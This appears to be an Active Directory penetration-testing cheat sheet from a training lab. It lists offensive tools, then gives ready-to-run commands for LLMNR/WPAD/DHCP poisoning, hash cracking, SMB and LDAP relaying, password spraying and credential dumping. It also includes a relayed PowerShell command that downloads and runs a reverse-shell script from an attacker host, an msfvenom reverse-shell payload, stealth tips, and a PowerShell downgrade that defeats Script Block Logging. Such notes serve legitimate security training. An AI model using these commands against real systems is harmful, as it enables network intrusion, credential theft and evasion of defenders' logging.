# Tools of the Trade

| Tool                                                                                                                                          | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| --------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView) | A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound)                                                                                      | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a [Neo4j](https://neo4j.com/) database for graphical analysis of the AD environment.                                                                                                                                                                                             |
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)                                                               | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.                                                                                                                                                                                                                                                                                                       |
| [BloodHound.py](https://github.com/fox-it/BloodHound.py)                                                                                      | A Python-based BloodHound ingestor based on the [Impacket toolkit](https://github.com/CoreSecurity/impacket/). It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.                                                                                                                                                                                                                                                                                                                      |
| [Kerbrute](https://github.com/ropnop/kerbrute)                                                                                                | A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| [Impacket toolkit](https://github.com/SecureAuthCorp/impacket)                                                                                | A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.                                                                                                                                                                                                                                                                                                                                                                                                                              |
| [Responder](https://github.com/lgandx/Responder)                                                                                              | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1)                                                             | Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| [C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh)                                                    | The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [rpcinfo](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo)                                           | The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges.                                                                                                                                                             |
| [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)                                                               | A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [CrackMapExec (CME)](https://github.com/byt3bl33d3r/CrackMapExec)                                                                             | CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.                                                                                                                                                                                                                                                                                                                                  |
| [Rubeus](https://github.com/GhostPack/Rubeus)                                                                                                 | Rubeus is a C# tool built for Kerberos Abuse.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)                                              | Another Impacket module geared towards finding Service Principal names tied to normal users.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| [Hashcat](https://hashcat.net/hashcat/)                                                                                                       | A great hash cracking and password recovery tool.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)                                                                                   | A tool for enumerating information from Windows and Samba systems.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)                                                                                       | A rework of the original Enum4linux tool that works a bit differently.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| [ldapsearch](https://linux.die.net/man/1/ldapsearch)                                                                                          | Built-in interface for interacting with the LDAP protocol.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| [windapsearch](https://github.com/ropnop/windapsearch)                                                                                        | A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray)                                                                    | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)                                                                                      | The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).                                                                                                                                                                                                                                                                                                                                                                                              |
| [smbmap](https://github.com/ShawnDEvans/smbmap)                                                                                               | SMB share enumeration across a domain.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)                                                        | Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)                                                      | Part of the Impacket toolkit, it provides the capability of command execution over WMI.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| [Snaffler](https://github.com/SnaffCon/Snaffler)                                                                                              | Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)                                                  | Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11))             | Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| [Mimikatz](https://github.com/ParrotSec/mimikatz)                                                                                             | Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)                                              | Remotely dump SAM and LSA secrets from a host.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| [evil-winrm](https://github.com/Hackplayers/evil-winrm)                                                                                       | Provides us with an interactive shell on a host over the WinRM protocol.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)                                              | Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| [noPac.py](https://github.com/Ridter/noPac)                                                                                                   | Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py)                                                      | Part of the Impacket toolset, RPC endpoint mapper.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)                                                       | Printnightmare PoC in python.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)                                                | Part of the Impacket toolset, it performs SMB relay attacks.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| [PetitPotam.py](https://github.com/topotam/PetitPotam)                                                                                        | PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)                                                        | Tool for manipulating certificates and TGTs.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py)                                                              | This tool will use an existing TGT to request a PAC for the current user using U2U.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| [adidnsdump](https://github.com/dirkjanm/adidnsdump)                                                                                          | A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)                                                                                        | Extracts usernames and passwords from Group Policy preferences files.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)                                                | Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.                                                                                                                                                                                                                                                                                                                             |
| [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py)                                                  | SID bruteforcing tool.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)                                                    | A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)                                                | Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| [Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)                                               | Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.                                                                                                                                                   |
| [PingCastle](https://www.pingcastle.com/documentation/)                                                                                       | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security).                                                                                                                                                                                                                                                                                                                                                                               |
| [Group3r](https://github.com/Group3r/Group3r)                                                                                                 | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| [ADRecon](https://github.com/adrecon/ADRecon)                                                                                                 | A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.                                                                                                                                                                                                                                                                                                                                                              |
# Network enumeration

## Passive

Wireshark

```shell
sudo -E wireshark
```

If we are on a host without a GUI (which is typical), we can use [tcpdump](https://linux.die.net/man/8/tcpdump), [net-creds](https://github.com/DanMcInerney/net-creds), and [NetMiner](https://www.netminer.com/en/product/netminer.php), etc., to perform the same functions. We can also use tcpdump to save a capture to a .pcap file, transfer it to another host, and open it in Wireshark.

tcpdump

```shell
sudo tcpdump -i ens224 
```

Responder (in analyze mode)

```shell
sudo responder -I ens224 -A 
```

Netdiscover

```shell
sudo netdiscover -i <INTERFACE> -r <IP_RANGE>
```

dnsrecon

```shell
dnsrecon -d INLANEFREIGHT.LOCAL
```

## Active checks

Fping

```shell
fping -asgq 172.16.5.0/23
```

Nmap aggressive scan

```shell
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

Get domain info

```shell
set user
```

User enumeration with Kerbrute

```shell
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

# LLMNR/NBT-NS Poisoning

Several tools can be used to attempt LLMNR & NBT-NS poisoning:

| **Tool**                                              | **Description**                                                                                     |
| ----------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
| [Responder](https://github.com/lgandx/Responder)      | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions. |
| [Inveigh](https://github.com/Kevin-Robertson/Inveigh) | Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.      |
| [Metasploit](https://www.metasploit.com/)             | Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.  |
|                                                       |                                                                                                     |
## Responder

**LLMNR Poisoning (SMB)**

```shell
responder -I eth0 -rf
```

- ‘-r’ = Enable answers for netbios wredir suffix queries.
- ‘-f’ = This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.

How Responder works to poison SMB

- A user types a share name incorrect resulting in DNS not being able to resolve the requested resource.
- The system broadcasts out to the network using LLMNR/NBT-NS as a fall back asking: “does anyone know how to connect to this share?”
- We (the attacker with responder running) manage to intercept this request and responder replies to the broadcast “I know how, send me your hash and I will connect you.”
- The system attempts to connect the user to the share by supplying its NetNTLMv2 hash and then responder says “On second though, that’s actually not me… deuces!” and closes the connection.
- For every response provided by responder, the users IP address, username and NetNTLMv2 hash are output into responder and are also saved in a file on our attacker machine.

**LLMNR Poisoning (WPAD)**

```shell
responder -I eth0 -wrfv
```

- ‘-w’ = Start the WPAD rogue proxy server.

```shell
responder -I eth0 -wrfFb
```

- ‘-F’ = Force NTLM/Basic authentication on wpad.dat file retrieval (forces a login prompt to appear).
- ‘-b’ = Return a Basic HTTP authentication (plaintext passwords).

/etc/responder/responder.conf
```
WPADScript = function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY 172.16.1.30:3128; PROXY 172.16.1.30:3141; DIRECT';}
```

How Responder works to poison WPAD

- The domain has WPAD configured to proxy all requests using a single configuration (.dat) file. However, we will see this not actually necessary as we can setup our own rogue proxy server. All the domain needs is to have the Internet Options set so that their browser calls out to WPAD, which happens to be the default.
- A user mistypes a URL in the address bar resulting in DNS not being able to resolve the requested resource.
- We (the attacker with responder running) manage to intercept this request and responder replies to the broadcast “I know where that domain is, send me your hash and I will connect you.”
- The system attempts to connect the user to our rogue WPAD server by supplying its NetNTLMv2 hash and then responder says “On second though, that’s actually not me.” and closes the connection.
- The users IP address, username and NetNTLMv2 hash are then output into responder as they got served up in the initial request.

**LLMNR Poisoning (DHCP)**

```shell
responder -I eth0 -wrfPdv
```

- ‘-P’ = Force NTLM (transparently)/Basic (prompt) authentication for the proxy. WPAD doesn’t need to be ON.
- ‘-d’ = Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response.
- ‘-v’ = Increase verbosity.

How Responder works to poison DHCP

- The domain does not use static IP addresses and uses DHCP to lease out IP addresses.
- A user’s DCHP lease expires and they automatically renew a new on. For example, a user turns on their computer after turning it off for the weekend and when their system boots up, it requests an IP from DHCP.
- We (the attacker with responder running) manage to win the race against the legit DHCP server to answers with a DHCP ACK containing invalid network settings, a valid WPAD server (Responder IP) and a short lease time of only 10 seconds.
- The workstation gets the WPAD server injected and will issue a new DHCP request right after, Responder will let the networks DHCP server do its job and provide the legitimate network settings. 
- The computer’s IP address, username and NetNTLMv2 hash are then output into responder as they got served up in the initial request.
- The user goes about their business as normal but hashes start flowing into

**Cracking an NTLMv2 Hash With Hashcat**

```shell
hashcat -m 5600 /usr/share/responder/logs/HTTP-NTLMv2-172.16.1.100.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```

**Getting an NetNTLMv2 Hash from MS-SQL (port 1433)**

```
mssqlclient.py -p 1433 reporting@10.10.10.125 -windows-auth
```

```
responder -I tun0
```

```sql
exec master..xp_dirtree '\\10.10.14.2\test'
```

**Getting an NetNTLMv2 Hash from an SSRF Vulnerability**

```
responder -I tun0
```

## Inveigh

```powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
```

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

We can hit the `esc` key to enter the console while Inveigh is running.

After typing `HELP` and hitting enter, we are presented with several options.

We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.

We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected. This is helpful if we want a listing of users to perform additional enumeration against and see which are worth attempting to crack offline using Hashcat.

# SMB Relay Attack

An SMB relay attack is where an attacker captures a users NTLM hash and then relays it to access another machine on the network that has SMB signing disabled.

If the account being relayed has local administrative privileges on the box, you can utilize their privileges to dump SAM hashes or to get a SYSTEM shell on the host.

**Finding Hosts with SMB Signing Disabled**

```shell
nxc smb 172.16.1.0/24 --gen-relay-list smb_signing_disabled.txt
```

**Setting Up Responder for the Attack**

To perform an SMB relay attack using Responder, we need to edit the Responder.conf file and disable SMB and HTTP so that we only listen for requests but not respond.

```shell
responder -I eth0 -v
```

> [!NOTE] **SMB-Relay Attack Using Responder + ntlmrelayx.py**
> If the account that makes a request is a regular domain user, then we can drop into a SMB shell similar to using smbexec.py. However, if the account has at least local administrative privileges on the target machine, we can dump the SAM file to get local password hashes, launch a SYSTEM shell, pivot to other devices, and much more!

## Getting an SMB Shell as a Standard User

```shell
ntlmrelayx.py -tf SMB_IPs.txt -smb2support -i
```

This command will relay all requests from any IP in the list to all IPs in the list. If an account that gets relayed from one machine to another has permissions to access a share folder, then because we used the **-i** switch, this will create a bind port on the victim on port 11000 that can be accessed using netcat.

**Connect to share**

```shell
nc -nv 127.0.0.1 11001
```

## Dumping the Local SAM Hashes by Relaying a Local Admin User’s Hash

This is the default

```shell
ntlmrelayx.py -tf SMB_IPs.txt -smb2support -i
```

## Command Execution as SYSTEM by Relaying a Local Admin User’s Hash

```shell
ntlmrelayx.py -tf SMB_IPs.txt -smb2support -c 'whoami'
```

**Reverse shell**

```shell
ntlmrelayx.py -tf SMB_IPs.txt -smb2support -c "powershell.exe -c iex(new-object net.webclient).downloadstring('http://172.16.1.30:8000/Invoke-PowerShellTcp443.ps1')" 
```

## Download and Execute an EXE as SYSTEM by Relaying a Local Admin User’s Hash

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f exe -o shell.exe
```

```shell
ntlmrelayx.py -tf SMB_IPs.txt -smb2support -e ./shell.exe
```

> [!WARNING] Stealth
> Although this technique is fairly easy, it is still better to get a shell using the **-c** switch + the Nishang script since that downloads / executes directly into memory. Since the **-e** switch downloads the executable to disk, it is less stealthy than using Nishang.

# LDAP(S) Relay Attack

LDAP(S) works by binding an LDAP user to an LDAP server. The client sends an operation request that asks for a particular set of information, such as user login credentials or other organizational data. The LDAP server then processes the query based on its internal language, communicates with directory services if needed, and provides a response.

LDAP Relay attacks occur when an NTLM authentication request is performed and an attacker captures the credentials and relays them to a Domain Controller by leveraging the LDAP protocol. By default LDAP signing and channel binding is not enabled, which allows us as the attacker to intercept the LDAP request and grab all the information it was sending over.

## LDAP(S)-Relay Attack via DNS Takeover Using mitm6 + ntlmrelayx.py

```shell
mitm6 -i eth0 -d juggernaut.local
```

```shell
ntlmrelayx.py -6 -t ldaps://172.16.1.5 -smb2support -wh fakewpad.juggernaut.local -l gimmedaloot
```

# Password Spraying

## Password Policies

Enumerating the Password Policy - from Linux - Credentialed

```shell
nxc smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

Enumerating the Password Policy - from Linux - SMB NULL Sessions

```shell
rpcclient -U "" -N 172.16.5.5
```

```shell
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

Enumerating Null Session - from Windows

```shell
net use \\DC01\ipc$ "" /u:""
```

Enumerating the Password Policy - from Linux - LDAP Anonymous Bind

```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Enumerating the Password Policy - from Windows

```shell
net accounts
```

```powershell
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy
```

## User Enumeration

SMB NULL Session to Pull User List

```shell
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

```shell
rpcclient -U "" -N 172.16.5.5
```

```shell
nxc smb 172.16.5.5 --users
```

```shell
sudo nxc smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

Gathering Users with LDAP Anonymous

```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

```shell
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

Kerbrute

```shell
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

Using Kerbrute for username enumeration will generate event ID [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768). This will only be triggered if [Kerberos event logging](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging) is enabled via Group Policy. Defenders can tune their SIEM tools to look for an influx of this event ID, which may indicate an attack. If we are successful with this method during a penetration test, this can be an excellent recommendation to add to our report.

## Internal Password Spraying - from Linux

```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

```shell
sudo nxc smb 172.16.5.5 -u valid_users.txt -p Password123
```

Local Administrator Password Reuse - Local Admin Spraying with CrackMapExec

```shell
sudo nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

## Internal Password Spraying - from Windows

Using DomainPasswordSpray.ps1

https://github.com/dafthack/DomainPasswordSpray

```powershell
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

# Enumerating Security Controls

## Windows Defender
```powershell
PS C:\htb> Get-MpComputerStatus
```

## AppLocker
```powershell
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## PowerShell Constrained Language Mode
```powershell
PS C:\htb> $ExecutionContext.SessionState.LanguageMode
```

## LAPS

```powershell
PS C:\htb> Find-LAPSDelegatedGroups
```

```powershell
PS C:\htb> Find-AdmPwdExtendedRights
```

```powershell
PS C:\htb> Get-LAPSComputers
```

# Credentialed Enumeration - from Linux

## NetExec (CrackMapExec)

Domain User Enumeration

```shell
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

Domain Group Enumeration

```shell
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

Logged On Users

```shell
sudo nxc smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

Share Enumeration - Domain Controller

```shell
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

Spider_plus

```shell
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

Dump credentials

```shell
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --lsa
```

## SMBMap

SMBMap To Check Access

```shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

Recursive List Of All Directories

```shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

## rpcclient

```shell
rpcclient -U "" -N 172.16.5.5
```

rpcclient Enumeration

RPCClient User Enumeration By RID

```shell
rpcclient $> queryuser 0x457
```

Enumdomusers

```shell
rpcclient $> enumdomusers
```

## Impacket Toolkit

Psexec.py

```shell
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```

wmiexec.py

```shell
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```

## Windapsearch

```shell
windapsearch.py -h
```

Windapsearch - Domain Admins

```shell
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

Windapsearch - Privileged Users

```shell
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

## Bloodhound.py

The tool consists of two parts: the [SharpHound collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an `ingestor`) and the [BloodHound](https://github.com/BloodHoundAD/BloodHound/releases) GUI tool which allows us to upload collected data in the form of JSON files. Once uploaded, we can run various pre-built queries or write custom queries using [Cypher language](https://blog.cptjesus.com/posts/introtocypher). The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.

It was initially only released with a PowerShell collector, so it had to be run from a Windows host. Eventually, a Python port (which requires Impacket, `ldap3`, and `dnspython`) was released by a community member. 
https://github.com/Fox-IT/BloodHound.py

Collector

```shell
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
```

GUI

```shell
sudo neo4j start
```

```shell
bloodhound
```

https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/

# Credentialed Enumeration - from Windows

## ActiveDirectory PowerShell Module

Discover Modules
```powershell
PS C:\htb> Get-Module
```

Load ActiveDirectory Module
```powershell
PS C:\htb> Import-Module ActiveDirectory
```

Get Domain Info
```powershell
PS C:\htb> Get-ADDomain
```

Get-ADUser
```powershell
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

Checking For Trust Relationships
```powershell
PS C:\htb> Get-ADTrust -Filter *
```

Group Enumeration
```powershell
PS C:\htb> Get-ADGroup -Filter * | select name
```

Detailed Group Info
```powershell
PS C:\htb> Get-ADGroup -Identity "Backup Operators"
```

Group Membership
```powershell
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
```

## PowerView

Domain User Information
```powershell
PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

Recursive Group Membership
```powershell
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

Trust Enumeration
```powershell
PS C:\htb> Get-DomainTrustMapping
```

Testing for Local Admin Access
```powershell
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

Finding Users With SPN Set
```powershell
PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

## SharpView

Another tool worth experimenting with is SharpView, a .NET port of PowerView. Many of the same functions supported by PowerView can be used with SharpView. We can type a method name with `-Help` to get an argument list.

```powershell
PS C:\htb> .\SharpView.exe Get-DomainUser -Help
```

```powershell
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend
```

## Snaffler

[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.

```shell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

## Sharphound

```powershell
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
```

# Living Off the Land

## Basic Enumeration Commands

|**Command**|**Result**|
|---|---|
|`hostname`|Prints the PC's Name|
|`[System.Environment]::OSVersion.Version`|Prints out the OS version and revision level|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patches and hotfixes applied to the host|
|`ipconfig /all`|Prints out network adapter state and configurations|
|`set`|Displays a list of environment variables for the current session (ran from CMD-prompt)|
|`echo %USERDOMAIN%`|Displays the domain name to which the host belongs (ran from CMD-prompt)|
|`echo %logonserver%`|Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|
## Downgrade Powershell

With [Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2) enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0.

```powershell
PS C:\htb> powershell.exe -version 2
```

## Checking Defenses

Firewall Checks
```powershell
PS C:\htb> netsh advfirewall show allprofiles
```

Windows Defender Check (from CMD.exe)
```shell
C:\htb> sc query windefend
```

